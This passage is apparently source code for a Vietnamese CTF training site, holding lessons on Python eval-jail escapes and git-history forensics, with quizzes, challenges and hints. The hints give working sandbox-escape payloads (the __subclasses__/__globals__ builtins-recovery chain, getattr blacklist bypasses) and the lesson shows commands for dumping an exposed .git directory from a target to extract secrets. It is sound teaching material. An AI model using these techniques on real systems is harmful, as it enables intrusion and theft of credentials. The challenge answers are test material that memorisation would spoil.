<p>Trong <code>eval</code> chỉ được viết <strong>một biểu thức</strong>: không có dấu <code>=</code> gán biến, không có <code>for</code> nhiều dòng. Dùng list comprehension <code>[... for c in ... if ...][0]</code> để lọc trong một biểu thức.</p></div>
<div data-widget="pyjail" data-level="2"></div>
<div data-chal="misc-jail-3"></div>

<h2 id="phong-thu">Phòng thủ đúng cách</h2>
<p>Không thể "vá" eval bằng blacklist. Muốn chạy code không tin cậy, hãy cô lập ở mức hệ điều hành: container, máy ảo, seccomp, hoặc runtime như WebAssembly (chính trang này dùng Pyodide chạy trong trình duyệt của bạn). Nếu chỉ cần tính biểu thức số, dùng <code>ast.literal_eval</code> hoặc tự viết parser.</p>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Blacklist chặn từ <code>open</code>. Biểu thức nào vẫn gọi được hàm open?",
      options: ["<code>op en('f')</code>", "<code>getattr(__builtins__, 'nepo'[::-1])('f')</code>", "<code>'open'('f')</code>", "<code>OPEN('f')</code>"],
      answer: 1,
      explain: "Chuỗi 'nepo'[::-1] chỉ thành 'open' lúc chạy nên blacklist không thấy. getattr lấy hàm theo tên.",
    },
    {
      q: "<code>().__class__.__base__</code> trả về gì?",
      options: ["tuple", "object", "type", "None"],
      answer: 1,
      explain: "().__class__ là tuple; lớp cha của tuple là object, gốc của mọi lớp trong Python.",
    },
  ],
  challenges: {
    "misc-jail-1": {
      title: "rbash", pts: 75, diff: "easy",
      hash: "847aae9696764f0bcfbafde58622a90f8d807f14378fe9134e9cc194469a3c82",
      body: "<p>Đọc <code>flag.txt</code> trong terminal jail ở trên dù <code>cat</code>, <code>head</code>, <code>grep</code>… đều bị cấm.</p>",
      hints: ["Lệnh nào khác cũng in nội dung file ra màn hình? Xem danh sách trong bài.", "<code>rev flag.txt | rev</code> hoặc <code>sort flag.txt</code>."],
    },
    "misc-jail-2": {
      title: "PyJail 1", pts: 150, diff: "med",
      hash: "0ab817d930300e046d15257e8799f6ffffabe7ebb19f9ba879cde16fa2d3faea",
      body: "<p>Đọc <code>/tmp/jail1/flag.txt</code> qua jail mức 1 ở trên.</p>",
      hints: ["Cả <code>open</code> lẫn <code>flag</code> đều bị chặn, nên phải tạo cả tên hàm lẫn đường dẫn file bằng cách nối chuỗi.", "<code>getattr(__builtins__, 'op'+'en')('/tmp/jail1/fl'+'ag.txt').read()</code>"],
    },
    "misc-jail-3": {
      title: "PyJail 2", pts: 250, diff: "hard",
      hash: "46c6db88ddf7f00352ec803f1ecedbd7cbbc5105ba2e6fb1f57f4b32254dfd60",
      body: "<p>Đọc <code>/tmp/jail2/flag.txt</code> qua jail mức 2: không có builtins nào.</p>",
      hints: ["Thử từng bước: <code>().__class__.__base__.__subclasses__()</code> trước, xem có <code>_wrap_close</code> không.", "Lọc lớp bằng list comprehension, rồi <code>.__init__.__globals__['__builtins__']</code> để lấy lại từ điển builtins.", "<code>[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['__builtins__']['op'+'en']('/tmp/jail2/fl'+'ag.txt').read()</code>"],
    },
  },
});

lesson({
  id: "misc-git",
  track: "misc",
  order: 4,
  level: 2,
  title: "Git & dấu vết",
  short: "Lịch sử git không bao giờ quên: commit cũ, nhánh, stash, thư mục .git lộ",
  time: "35 phút",
  html: `
<h2 id="git-nho-tat-ca">Git nhớ tất cả</h2>
<p>Git lưu <strong>mọi phiên bản</strong> của mọi file từng được commit. Một lập trình viên lỡ commit mật khẩu, rồi commit tiếp "xoá mật khẩu": file hiện tại sạch, nhưng mật khẩu vẫn nằm nguyên trong lịch sử. Đây là nguồn rò rỉ bí mật cực kỳ phổ biến ngoài đời thật, và là dạng bài quen thuộc trong CTF (misc, forensics, web).</p>

<h2 id="cau-truc">Bên trong thư mục .git</h2>
<table>
<tr><th>Thành phần</th><th>Ý nghĩa</th></tr>
<tr><td><code>.git/HEAD</code></td><td>Nhánh hiện tại, ví dụ <code>ref: refs/heads/main</code></td></tr>
<tr><td><code>.git/refs/heads/*</code></td><td>Mỗi nhánh là một file chứa mã hash của commit mới nhất</td></tr>
<tr><td><code>.git/objects/</code></td><td>Mọi dữ liệu (blob = nội dung file, tree = thư mục, commit), nén zlib, đặt tên theo SHA-1</td></tr>
<tr><td><code>.git/config</code></td><td>Cấu hình, địa chỉ remote (đôi khi chứa token trong URL)</td></tr>
<tr><td><code>refs/stash</code>, <code>logs/</code></td><td>Stash và reflog: những thay đổi tưởng đã bỏ đi</td></tr>
</table>
<p>Mỗi commit trỏ tới commit cha, tạo thành chuỗi lịch sử. Nhánh chỉ là "nhãn dán" lên một commit.</p>

<h2 id="lenh">Các lệnh điều tra</h2>
${sh`
# Toàn bộ lịch sử, mỗi commit một dòng, của mọi nhánh
$ git log --oneline --all
# Lịch sử kèm nội dung thay đổi (patch): dòng - bị xoá, dòng + được thêm
$ git log -p
# Chi tiết một commit
$ git show a83b02f
# Nội dung một file tại một commit cụ thể
$ git show a83b02f:config.py
# So sánh hai commit
$ git diff a83b02f c7e5d4b
# Nhánh (kể cả nhánh remote) và stash
$ git branch -a
$ git stash list
$ git stash show -p
# Nơi ghi lại mọi lần HEAD di chuyển, cứu được commit "đã mất"
$ git reflog
`}
<div class="callout tip"><b>Tìm nhanh bí mật</b>
<p><code>git log -p --all | grep -i -E "password|secret|token|key"</code>. Công cụ chuyên dụng: <strong>trufflehog</strong>, <strong>gitleaks</strong> quét toàn bộ lịch sử tìm khoá API.</p></div>

<h2 id="thuc-hanh">Thực hành: repo bị rò rỉ</h2>
<p>Đây là bản sao repo của một công ty. Thư mục hiện tại trông sạch sẽ. Hãy đào lịch sử.</p>
<div data-widget="shell" data-fs="misc-git" data-height="400"></div>
<div data-chal="misc-git-1"></div>
<div data-chal="misc-git-2"></div>
<div data-chal="misc-git-3"></div>

<h2 id="git-web">Thư mục .git lộ trên web</h2>
<p>Khi triển khai website bằng cách <code>git clone</code> thẳng vào thư mục web, đường dẫn <code>https://site/.git/</code> có thể truy cập được. Dù server tắt liệt kê thư mục, kẻ tấn công vẫn tải được từng file vì cấu trúc <code>.git</code> có thể đoán:</p>
<ol class="steps-v">
<li>Tải <code>/.git/HEAD</code> → biết nhánh <code>refs/heads/main</code>.</li>
<li>Tải <code>/.git/refs/heads/main</code> → có hash commit mới nhất.</li>
<li>Tải <code>/.git/objects/ab/cdef…</code> (2 ký tự đầu của hash làm thư mục), giải nén zlib → đọc ra commit cha, tree, blob… lặp lại tới hết.</li>
</ol>
<p>Các công cụ <strong>git-dumper</strong>, <strong>GitTools</strong> tự động hoá việc này, rồi bạn có cả mã nguồn và lịch sử để chạy <code>git log -p</code> như trên.</p>
${sh`
$ curl -s https://target/.git/HEAD
ref: refs/heads/main
$ pip install git-dumper
$ git-dumper https://target/.git/ ./dump
$ cd dump && git log -p
`}
<div class="callout danger"><b>Xoá bí mật đúng cách</b>
<p>Commit "xoá mật khẩu" không xoá được gì. Bí mật đã lên git thì coi như <strong>đã lộ</strong>: phải đổi (rotate) ngay. Sau đó mới dọn lịch sử bằng <code>git filter-repo</code> hoặc BFG, và force-push.</p></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Lập trình viên commit file .env chứa mật khẩu, sau đó commit tiếp lệnh xoá file. Mật khẩu còn lấy lại được không?",
      options: ["Không, file đã bị xoá", "Có, bằng git log -p hoặc git show &lt;commit cũ&gt;", "Chỉ khi chưa push", "Chỉ quản trị viên GitHub lấy được"],
      answer: 1,
      explain: "Mỗi commit là một ảnh chụp đầy đủ. Commit cũ vẫn chứa file .env nguyên vẹn.",
    },
    {
      q: "Tệp nào trong .git cho biết commit mới nhất của nhánh main?",
      options: [".git/HEAD", ".git/refs/heads/main", ".git/config", ".git/index"],
      answer: 1,
      explain: ".git/HEAD chỉ nói đang ở nhánh nào; .git/refs/heads/main chứa hash commit đầu nhánh.",
    },
  ],
  challenges: {
    "misc-git-1": {
      title: "Mật khẩu đã xoá", pts: 75, diff: "easy",
      hash: "de02a30e291c47c20f448559160f4701b76614c0b23101bb3eed4a6bb36eb676",
      body: "<p>Một commit có lời nhắn \"Xoá mật khẩu khỏi config\". Mật khẩu cũ là flag.</p>",
      hints: ["<code>cd webapp</code> rồi <code>git log --oneline</code> để xem các commit.", "<code>git log -p</code> và tìm dòng bắt đầu bằng <code>-DB_PASSWORD</code>, hoặc <code>git show a83b02f:config.py</code>."],
    },
    "misc-git-2": {
      title: "Nhánh bí mật", pts: 100, diff: "med",
      hash: "4e54ebf12be9c6e38c0d741ab2fd86f4c4d6ffd65901a3f74b8cccb0c599f153",
      body: "<p>Ai đó đang làm dở một tính năng ở nhánh khác và để quên thông tin đăng nhập.</p>",
      hints: ["<code>git branch -a</code> liệt kê các nhánh.", "<code>git log --oneline dev</code>, rồi <code>git show dev</code> hoặc <code>git checkout dev</code> và đọc file mới."],
    },
    "misc-git-3": {
      title: "Cất đi nhưng chưa mất", pts: 100, diff: "med",
      hash: "1792bf8b0b32c02258e806f35d85c18dfff415a0bade26c4ee6a84e677c037d8",
      body: "<p>Không có trong commit nào, không có trong nhánh nào. Nhưng git vẫn đang giữ nó.</p>",
      hints: ["Git có chỗ cất tạm thay đổi chưa commit. Lệnh gì?", "<code>git stash list</code>, rồi <code>git stash show -p</code>."],
    },
  },
});
